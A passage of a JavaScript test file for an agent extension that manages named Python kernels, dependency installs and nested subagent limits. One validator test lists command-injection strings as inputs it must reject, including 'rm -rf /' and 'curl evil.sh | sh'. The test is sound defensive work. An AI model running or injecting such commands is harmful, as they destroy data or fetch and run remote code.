    assert.doesNotMatch(quiet, /Out\[ \]:/);
  } finally {
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("parallel exec_cell calls require explicit named command targets", async () => {
  const sandbox = {
    async cleanup() {},
    spawn() { throw new Error("sandbox spawn should not be used"); },
    getRuntimeWorkspaceRoot(cwd) { return cwd; },
  };
  const pending = new Map();
  const interrupted = [];
  const restore = restoreInjectedModules(sandbox, {
    execForeground(sessionId) {
      return new Promise((resolve) => pending.set(sessionId, resolve));
    },
    list() {
      return [
        { id: "s1", name: "s1", chunks: 0, running: false },
        { id: "s2", name: "s2", chunks: 0, running: false },
      ];
    },
    mostRecentActive() { return null; },
    interruptRunning(sessionId) {
      interrupted.push(sessionId);
      return true;
    },
  });

  try {
    const ptcExtension = await loadExtension();
    const eventHandlers = new Map();
    const registered = [];
    const { pi, commands } = buildPi({ eventHandlers, registered, activeTools: [] });
    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });
    const execCell = registered.find((tool) => tool.name === "exec_cell");
    const ctx = { cwd: process.cwd() };

    const first = execCell.execute("call-1", { kernel: "s1", code: "1" }, undefined, undefined, ctx);
    const second = execCell.execute("call-2", { kernel: "s2", code: "2" }, undefined, undefined, ctx);
    await commands.ptc.handler("interrupt s2", { ui: { notify() {} } });
    assert.equal(interrupted.at(-1), "s2");

    pending.get("s1")(successResult());
    await first;
    await commands.ptc.handler("interrupt s2", { ui: { notify() {} } });
    assert.equal(interrupted.at(-1), "s2");

    pending.get("s2")(successResult());
    await second;
  } finally {
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("failed exec_cell tool results receive terminal telemetry", async () => {
  const sandbox = {
    async cleanup() {},
    spawn() { throw new Error("sandbox spawn should not be used"); },
    getRuntimeWorkspaceRoot(cwd) { return cwd; },
  };
  const restore = restoreInjectedModules(sandbox, {
    execForeground() { throw new Error("kernel failed"); },
  });

  try {
    const ptcExtension = await loadExtension();
    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });
    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });
    eventHandlers.get("before_agent_start")({ prompt: "Analyze files", systemPrompt: "base" });

    const execCell = registered.find((tool) => tool.name === "exec_cell");
    await assert.rejects(
      execCell.execute("failed-call", { kernel: "s1", code: "1" }, undefined, undefined, { cwd: process.cwd() }),
      /kernel failed/
    );
    const transformed = eventHandlers.get("tool_result")({
      toolName: "exec_cell",
      isError: true,
      details: undefined,
    });
    assert.equal(transformed.details.telemetry.terminalState, "failed_without_recovery");
    assert.equal(transformed.details.telemetry.routedToCodeExecution, true);
  } finally {
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("provision_dependency rejects nested installers before resolving or spawning", async () => {
  const sandbox = {
    async cleanup() {},
    spawn() { throw new Error("nested installer spawned a process"); },
    getRuntimeWorkspaceRoot(cwd) { return cwd; },
    resolvePythonExecutable() { throw new Error("nested installer resolved Python"); },
  };
  const restore = restoreInjectedModules(sandbox);
  const previousDepth = process.env.PI_SUBAGENT_DEPTH;
  const previousToken = process.env.PI_SUBAGENTS_PARENT_TOKEN;
  try {
    const ptcExtension = await loadExtension();
    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });
    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });
    const dependency = registered.find((tool) => tool.name === "provision_dependency");
    for (const [depth, token] of [["1", undefined], ["0", "inherited-parent"]]) {
      process.env.PI_SUBAGENT_DEPTH = depth;
      if (token === undefined) delete process.env.PI_SUBAGENTS_PARENT_TOKEN;
      else process.env.PI_SUBAGENTS_PARENT_TOKEN = token;
      const result = await dependency.execute("nested-dependency", { package: "pi-subagents", kernel: "missing" });
      assert.equal(result.isError, true);
      assert.equal(result.details.error, "nested-dependency-install-blocked");
      assert.match(result.content[0].text, /root agent.*provision dependencies/);
      assert.doesNotMatch(result.content[0].text, /Unknown python session/);
    }
  } finally {
    if (previousDepth === undefined) delete process.env.PI_SUBAGENT_DEPTH;
    else process.env.PI_SUBAGENT_DEPTH = previousDepth;
    if (previousToken === undefined) delete process.env.PI_SUBAGENTS_PARENT_TOKEN;
    else process.env.PI_SUBAGENTS_PARENT_TOKEN = previousToken;
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("provision_dependency does not treat spawn failures as successful installs", async () => {
  const sandbox = {
    async cleanup() {},
    spawn() { throw new Error("sandbox spawn should not be used"); },
    getRuntimeWorkspaceRoot(cwd) { return cwd; },
    resolvePythonExecutable() { return "python3"; },
  };
  const restore = restoreInjectedModules(sandbox);
  const previousPath = process.env.PATH;

  try {
    const ptcExtension = await loadExtension();
    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });
    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });
    const provisionDependency = registered.find((tool) => tool.name === "provision_dependency");

    process.env.PATH = "/definitely/missing";
    const result = await provisionDependency.execute(
      "dependency-call",
      { package: "example-package", kernel: "s1" },
      undefined,
      undefined,
      { cwd: process.cwd() }
    );
    const text = result.content[0].text;
    assert.match(text, /executable not found \(ENOENT\)/);
    assert.doesNotMatch(text, /already satisfied/);
  } finally {
    process.env.PATH = previousPath;
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

function successResult() {
  return {
    output: "ok",
    images: undefined,
    details: {
      nestedToolCalls: 0,
      nestedToolNames: [],
      nestedResultChars: 0,
      nestedResultCount: 0,
      nestedErrors: 0,
      durationMs: 1,
      estimatedAvoidedTokens: 0,
    },
  };
}
test("isValidPythonVersion accepts plain versions and rejects injection attempts", async () => {
  const { isValidPythonVersion } = require("../dist/utils.js");
  // Leading/trailing whitespace is trimmed before matching (harmless; the
  // trimmed value must still match the strict pattern).
  for (const ok of ["3.14", "3.14.4", "3.15.0b1", "3.14.0rc2", "3.13.1a3", " 3.12 ", " 3.14 "]) {
    assert.equal(isValidPythonVersion(ok), true, `expected accept: ${ok}`);
  }
  for (const bad of [ // (trimmed whitespace is accepted by design; nothing else is)
    "3.14 --allow-insecure-host my-malware-site.com",
    "3.14; rm -rf /",
    "3.14 && curl evil.sh | sh",
    "3.14 --index-url http://evil",
    "python3", "3", "v3.14", "3.14.4.1", "3.14.x", "",
    "3.14.4+mypatch", "3.14.4.post1", "$(echo 3.14)", "3.14 # comment",
  ]) {
    assert.equal(isValidPythonVersion(bad), false, `expected reject: ${JSON.stringify(bad)}`);
  }
});

test("subagentsProvisioningEnabled: opt-in via PI_SUBAGENTS_MAX_CONCURRENT", async () => {
  const { subagentsProvisioningEnabled } = require("../dist/utils.js");
  const original = process.env.PI_SUBAGENTS_MAX_CONCURRENT;
  try {
    delete process.env.PI_SUBAGENTS_MAX_CONCURRENT;
    assert.equal(subagentsProvisioningEnabled(), false, "unset = disabled");
    process.env.PI_SUBAGENTS_MAX_CONCURRENT = "-1";
    assert.equal(subagentsProvisioningEnabled(), false, "-1 = disabled");
    process.env.PI_SUBAGENTS_MAX_CONCURRENT = "0";
    assert.equal(subagentsProvisioningEnabled(), false, "0 = disabled");
    process.env.PI_SUBAGENTS_MAX_CONCURRENT = "banana";
    assert.equal(subagentsProvisioningEnabled(), false, "garbage = disabled");
    process.env.PI_SUBAGENTS_MAX_CONCURRENT = "4";
    assert.equal(subagentsProvisioningEnabled(), true, "positive int = enabled");
    process.env.PI_SUBAGENTS_MAX_CONCURRENT = "8";
    assert.equal(subagentsProvisioningEnabled(), true, "positive int = enabled");
  } finally {
    if (original === undefined) delete process.env.PI_SUBAGENTS_MAX_CONCURRENT;
    else process.env.PI_SUBAGENTS_MAX_CONCURRENT = original;
  }
});

test("provision_dependency targets the requested kernel's venv and bootstraps pi_subagents into pinned envs", async () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "ptc-provision-"));
  const binDir = path.join(tmp, "bin");
  const logFile = path.join(tmp, "uv-calls.log");
  fs.mkdirSync(binDir);
  fs.writeFileSync(
    path.join(binDir, "uv"),
    '#!/bin/sh\necho "ARGV: $@" >> "' + logFile + '"\necho "Installed 1 package"\n',
  );
  fs.chmodSync(path.join(binDir, "uv"), 0o755);
  // fixture: a pi_subagents source dir the pinned bootstrap can install from
  const subagentsSource = path.join(tmp, "subagents-src", "main");
  fs.mkdirSync(subagentsSource, { recursive: true });
  fs.writeFileSync(path.join(subagentsSource, "pyproject.toml"), "[project]\nname='pi-subagents'\n");

  const previousPath = process.env.PATH;
  const previousSource = process.env.PTC_SUBAGENTS_SOURCE;
  process.env.PATH = binDir + path.delimiter + previousPath;
  process.env.PTC_SUBAGENTS_SOURCE = path.join(tmp, "subagents-src");

  const sharedPython = "/shared/venv/python";
  const pinnedPython = "/pinned/venv/python";
  const sandbox = { resolvePythonExecutable() { return sharedPython; } };
  const restore = restoreInjectedModules(sandbox);
  const { provisionDependencyTool } = require("../dist/index.js");

  try {
    // unknown kernel name → error listing live kernels
    const unknownManager = {
      get: () => false,
      list: () => [{ id: "live-1", name: "dependency-kernel" }],
      getPythonExecutable: () => undefined,
    };
    const unknown = await provisionDependencyTool(unknownManager, sandbox)
      .execute("t", { package: "numpy", kernel: "nope" }, undefined);
    assert.match(unknown.content[0].text, /Unknown kernel "nope"/);
    assert.match(unknown.content[0].text, /dependency-kernel/);

    // pinned kernel → installs into the pinned venv AND bootstraps pi_subagents
    const pinnedManager = {
      get: (id) => id === "k1",
      list: () => [{ id: "k1", name: "default-kernel" }],
      getPythonExecutable: (id) => (id === "k1" ? pinnedPython : undefined),
    };
    const pinned = await provisionDependencyTool(pinnedManager, sandbox)
      .execute("t", { package: "numpy", kernel: "default-kernel" }, undefined);
    assert.match(pinned.content[0].text, /pinned venv/);
    assert.match(pinned.content[0].text, /pi_subagents bootstrapped/);

    // unpinned kernel → shared python, no pi_subagents bootstrap
    fs.rmSync(logFile, { force: true });
    const sharedManager = {
      get: (id) => id === "k2",
      list: () => [{ id: "k2", name: "pinned-kernel" }],
      getPythonExecutable: () => undefined,
    };
    const shared = await provisionDependencyTool(sharedManager, sandbox)
      .execute("t", { package: "numpy", kernel: "pinned-kernel" }, undefined);
    assert.match(shared.content[0].text, /shared environment/);
    assert.doesNotMatch(shared.content[0].text, /pi_subagents bootstrapped/);

    // explicit kernel targeting still works (and is the only route)
    fs.rmSync(logFile, { force: true });
    await provisionDependencyTool(pinnedManager, sandbox).execute("t", { package: "numpy", kernel: "default-kernel" }, undefined);
    const logged = fs.readFileSync(logFile, "utf8");
    assert.match(logged, new RegExp(`--python ${pinnedPython.replace(/\//g, "\\/")} numpy`));
    assert.match(logged, /--editable/);
    const pinnedCalls = (logged.match(new RegExp(`--python ${pinnedPython.replace(/\//g, "\\/")}`, "g")) || []).length;
    assert.equal(pinnedCalls, 2, "package + pi_subagents both target the pinned venv");
    assert.ok(!logged.includes(sharedPython), "shared python untouched for a pinned kernel");

    // no implicit fallback: the kernel is required
    const noKernel = await provisionDependencyTool(pinnedManager, sandbox)
      .execute("t", { package: "numpy" }, undefined);
    assert.equal(noKernel.isError, true);
    assert.match(noKernel.content[0].text, /kernel name (?:must be|is required)/);
  } finally {
    process.env.PATH = previousPath;
    if (previousSource === undefined) delete process.env.PTC_SUBAGENTS_SOURCE;
    else process.env.PTC_SUBAGENTS_SOURCE = previousSource;
    fs.rmSync(tmp, { recursive: true, force: true });
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("subagent subscription receives the real manager hook and expires on reload/shutdown", async () => {
  const restore = restoreInjectedModules({ cleanup: async () => {} });
  const runtimeKey = Symbol.for("pi-pycells:subagent-runtime");
  try {
    const extension = await loadExtension();
    const handlers = new Map();
    const { pi } = buildPi({ eventHandlers: handlers, registered: [], activeTools: [] });
    await extension(pi);
    const first = globalThis[runtimeKey];
    const received = [];
    const unsubscribe = first.subscribe((payload) => received.push(payload));
    first.subscribe(() => { throw new Error("broken consumer"); });
    const snapshot = { rootId: "root-a", scope: "process", agents: [], totals: { running: 1 } };
    globalThis.__ptcPythonSessionManager.hooks.onSubagentSnapshot("kernel-a", "exec-a", snapshot);
    assert.deepEqual(received, [{ sessionId: "kernel-a", snapshot }]);
    unsubscribe();
    unsubscribe();
    globalThis.__ptcPythonSessionManager.hooks.onSubagentSnapshot("kernel-b", "exec-b", snapshot);
    assert.equal(received.length, 1);
    first.subscribe((payload) => received.push(payload));
    const oldManager = globalThis.__ptcPythonSessionManager;
    await extension(pi);
    oldManager.hooks.onSubagentSnapshot("old-kernel", "old-exec", snapshot);
    assert.equal(received.length, 1, "reload retires subscribers owned by the previous runtime");
    assert.equal(first.getSnapshot(), null);
    const second = globalThis[runtimeKey];
    second.subscribe((payload) => received.push(payload));
    await handlers.get("session_shutdown")();
    globalThis.__ptcPythonSessionManager.hooks.onSubagentSnapshot("closed", "closed", snapshot);
    assert.equal(received.length, 1);
    assert.equal(second.getSnapshot(), null);
  } finally { restore(); }
});

test("runtime totals count local sessions once and preserve root/session scope", async () => {
  const restore = restoreInjectedModules({});
  try {
    await loadExtension();
    const { createSubagentRuntime } = require("../dist/index.js");
    const snapshots = [
      { sessionId: "a", snapshot: { rootId: "root", scope: "process", depth: 0,
        agents: [], totals: { running: 2, settled: 1 } } },
      { sessionId: "b", snapshot: { rootId: "root", scope: "process", depth: 0,
        agents: [], totals: { running: 1, failed: 1 } } },
    ];
    const runtime = createSubagentRuntime({ allSubagentSnapshots: () => snapshots });
    runtime.publish("a", snapshots[0].snapshot);
    runtime.publish("a", snapshots[0].snapshot);
    assert.deepEqual(runtime.getSnapshot(), {
      sessions: snapshots, totals: { running: 3, settled: 1, failed: 1 },
    });
    runtime.dispose();
    let calls = 0;
    runtime.subscribe(() => calls++);
    runtime.publish("a", snapshots[0].snapshot);
    assert.equal(calls, 0);
  } finally { restore(); }
});

test("nested policy prompt describes opt-in spawning and legal boundary imports", async () => {
  const restore = restoreInjectedModules({ cleanup: async () => {} });
  const previousDepth = process.env.PI_SUBAGENT_DEPTH;
  const previousMaximum = process.env.PI_SUBAGENTS_MAX_DEPTH;
  try {
    const extension = await loadExtension();
    const handlers = new Map();
    const { pi } = buildPi({ eventHandlers: handlers, registered: [], activeTools: [] });
    await extension(pi);
    process.env.PI_SUBAGENT_DEPTH = "1";
    delete process.env.PI_SUBAGENTS_MAX_DEPTH;
    const flat = handlers.get("before_agent_start")({ systemPrompt: "base" });
    assert.match(flat.systemPrompt, /Importing pi_subagents remains legal/);
    assert.match(flat.systemPrompt, /Spawning is blocked at this depth boundary/);
    assert.doesNotMatch(flat.systemPrompt, /NotImplementedError/);
    process.env.PI_SUBAGENTS_MAX_DEPTH = "3";
    const optedIn = handlers.get("before_agent_start")({ systemPrompt: "base" });
    assert.match(optedIn.systemPrompt, /Spawning is enabled by the opt-in depth policy/);
    assert.match(optedIn.systemPrompt, /explicit task authorization/);
    assert.match(optedIn.systemPrompt, /saturated root admission fails fast/);
    process.env.PI_SUBAGENT_DEPTH = "3";
    assert.match(handlers.get("before_agent_start")({ systemPrompt: "base" }).systemPrompt,
      /Spawning is blocked at this depth boundary/);
    process.env.PI_SUBAGENT_DEPTH = "1junk";
    assert.throws(() => handlers.get("before_agent_start")({ systemPrompt: "base" }), /nonnegative integer/);
  } finally {
    if (previousDepth === undefined) delete process.env.PI_SUBAGENT_DEPTH;
    else process.env.PI_SUBAGENT_DEPTH = previousDepth;
    if (previousMaximum === undefined) delete process.env.PI_SUBAGENTS_MAX_DEPTH;
    else process.env.PI_SUBAGENTS_MAX_DEPTH = previousMaximum;
    restore();
  }
});

test("kernels are named, unique, and every operation targets an explicit kernel", async () => {
  const sandbox = {
    async cleanup() {},
    spawn() { throw new Error("sandbox spawn should not be used"); },
    getRuntimeWorkspaceRoot(cwd) { return cwd; },
  };
  const restore = restoreInjectedModules(sandbox, {
    async execForeground() { return successResult(); },
  });

  try {
    const ptcExtension = await loadExtension();
    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });
    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });
    const ctx = { cwd: process.cwd() };
    const byName = (name) => registered.find((tool) => tool.name === name);

    // Discovery is not a tool: there is no implicit kernel targeting route.
    assert.ok(!byName("list_kernels"), "list_kernels must not be registered");

    const provision = byName("provision_kernel");
    const created = await provision.execute("p1", { name: "analysis" }, undefined, undefined, ctx);
    assert.equal(created.isError, undefined);
    assert.equal(created.details.kernelName, "analysis");
    assert.match(created.content[0].text, /Provisioned kernel "analysis"/);
    assert.ok(!/[0-9a-f]{16,}/.test(created.content[0].text), "no opaque session id in the provision result");

    // Missing / blank / escape-character names are rejected before spawning.
    for (const badName of [undefined, "   ", "x\u001b[31m", "line\u0000break"]) {
      const bad = await provision.execute("p2", { name: badName }, undefined, undefined, ctx);
      assert.equal(bad.isError, true, `expected rejection for ${JSON.stringify(badName)}`);
      assert.match(bad.content[0].text, /kernel name/);
    }

    // Duplicate names among live kernels are rejected.
    const duplicate = await provision.execute("p3", { name: "analysis" }, undefined, undefined, ctx);
    assert.equal(duplicate.isError, true);
    assert.match(duplicate.content[0].text, /already in use|duplicate/i);

    // A distinct name still provisions (fake manager reuses id s1).
    const second = await provision.execute("p4", { name: "scratch" }, undefined, undefined, ctx);
    assert.equal(second.isError, undefined);

    // Unknown kernels fail with a name-based error on every operation.
    const ops = [
      ["exec_cell", { kernel: "ghost", code: "1" }],
      ["scratch_run", { kernel: "ghost", code: "1" }],
      ["write_cell", { kernel: "ghost", at: 1, source: "1" }],
      ["read_cell", { kernel: "ghost", n: 1 }],
      ["read_cells", { kernel: "ghost" }],
      ["read_cell_output", { kernel: "ghost", cellIdx: 1 }],
      ["run_cell", { kernel: "ghost", n: 1 }],
      ["run_to", { kernel: "ghost", n: 1 }],
      ["run_all", { kernel: "ghost" }],
      ["delete_cell", { kernel: "ghost", n: 1 }],
      ["inspect_kernel", { kernel: "ghost" }],
      ["reset_kernel", { kernel: "ghost" }],
      ["provision_dependency", { package: "numpy", kernel: "ghost" }],
      ["promote_to_skill_notebook", { kernel: "ghost", name: "nb" }],
      ["request_cell_review", { kernel: "ghost", n: 1 }],
    ];
    for (const [name, params] of ops) {
      const tool = byName(name);
      assert.ok(tool, `${name} must be registered`);
      const result = await tool.execute("op", params, undefined, undefined, ctx);
      assert.equal(result.isError, true, `${name} must reject the unknown kernel`);
      assert.match(result.content[0].text, /Unknown kernel "ghost"/, `${name} error names the kernel`);
      assert.match(result.content[0].text, /Live kernels: analysis, scratch|Live kernels: analysis/, `${name} error lists live kernels`);
      assert.ok(!/[0-9a-f]{16,}/.test(result.content[0].text), `${name} error must not leak session ids`);
    }

    // User-facing rendering never surfaces internal ids or reminders.
    const theme = { fg(_color, text) { return text; } };
    const provisionRendered = provision.renderResult(created, { isPartial: false }, theme).render(120)
      .join("\n").replace(/\x1b\[[0-9;]*m/g, "");
    assert.match(provisionRendered, /analysis/);
    assert.ok(!/session_id/.test(provisionRendered), "no session_id in user render");
    assert.ok(!new RegExp(created.details.sessionId).test(provisionRendered), "no opaque id in user render");
  } finally {
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});


test("every kernel tool renders named notebook identity and never exposes admin instructions", async () => {
  const restore = restoreInjectedModules({ envVars: {}, ready: true });
  try {
    const extension = await loadExtension();
    const eventHandlers = new Map();
    const registered = [];
    const { pi, commands } = buildPi({ eventHandlers, registered, activeTools: [] });
    await extension(pi);
    const ctx = { cwd: process.cwd() };
    await eventHandlers.get("session_start")({}, ctx);
    const tools = new Map(registered.map((tool) => [tool.name, tool]));
    const provision = tools.get("provision_kernel");
    const created = await provision.execute("new-kernel", { name: "review workspace", notebook: "/tmp/review.ipynb" }, undefined, undefined, ctx);
    assert.ok(!created.isError);
    const theme = { fg: (_color, text) => text };
    for (const tool of tools.values()) {
      assert.equal(tool.renderShell, "self", tool.name);
      assert.equal(typeof tool.renderCall, "function", tool.name);
      assert.equal(typeof tool.renderResult, "function", tool.name);
      const state = {};
      const params = tool.name === "provision_kernel"
        ? { name: "review workspace", notebook: "/tmp/review.ipynb" }
        : { kernel: "review workspace", n: 1, code: "x = 1", source: "x = 1" };
      const call = tool.renderCall(params, theme, { state }).render(100).join("\n");
      assert.match(call, /review workspace/, tool.name);
      assert.match(call, /review\.ipynb/, tool.name);
      assert.ok(!call.includes(created.details.sessionId), tool.name);
    }
    for (const name of ["inspect_kernel", "provision_dependency", "promote_to_skill_notebook"]) {
      const tool = tools.get(name);
      assert.ok(tool, name);
      for (const expanded of [false, true]) {
        const result = {
          content: [{ type: "text", text: "MODEL_ONLY_REMINDER every cell is appended; use exec_cell(session_id: deadbeef1234)" }],
          details: { kernelName: "review workspace", notebookPath: "/tmp/review.ipynb", sessionId: "deadbeef1234" },
        };
        const text = tool.renderResult(result, { expanded }, theme).render(100).join("\n");
        assert.ok(!text.includes("MODEL_ONLY_REMINDER"), name);
        assert.ok(!text.includes("deadbeef1234"), name);
      }
    }
    const notices = [];
    await commands.ptc.handler("kill", { ui: { notify: (message) => notices.push(message) } });
    assert.match(notices.at(-1), /kernel-name/);
    assert.match(created.content[0].text, /every cell is appended/);
  } finally {
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});


test("kernel directory rejects opaque aliases and shares the manager's name validation", () => {
  const { KernelDirectory } = require("../dist/tools/kernel-directory.js");
  const directory = new KernelDirectory({ list: () => [
    { id: "abcdef123456", name: "analysis", notebookPath: "/tmp/analysis.ipynb" },
  ] });
  assert.equal(directory.resolveKernel("analysis").id, "abcdef123456");
  assert.throws(() => directory.resolveKernel("abcdef123456"), /Unknown kernel.*Live kernels: analysis/);
  for (const name of ["", " \t ", "bad\u0085name", "x".repeat(65)]) {
    assert.throws(() => directory.assertAvailable(name));
  }
});


test("provision_kernel forwards the validated kernel name to the manager", async () => {
  const { KernelDirectory } = require("../dist/tools/kernel-directory.js");
  let receivedName;
  const manager = {
    list: () => [],
    resolveLibraryDir: () => "/tmp",
    provision: async (options) => {
      receivedName = options.name;
      return { name: options.name, id: "session-forward-1", notebookPath: options.notebookPath };
    },
    disposeAll: async () => {},
  };
  const directory = new KernelDirectory(manager);
  const { provisionKernelTool } = require("../dist/index.js");
  const tool = provisionKernelTool(manager, directory, {});
  const result = await tool.execute("call-1", { name: "analysis" }, undefined, undefined, { cwd: "/tmp" });
  assert.equal(result.isError, undefined);
  assert.equal(receivedName, "analysis");
  assert.match(JSON.stringify(result.details), /analysis/);
});
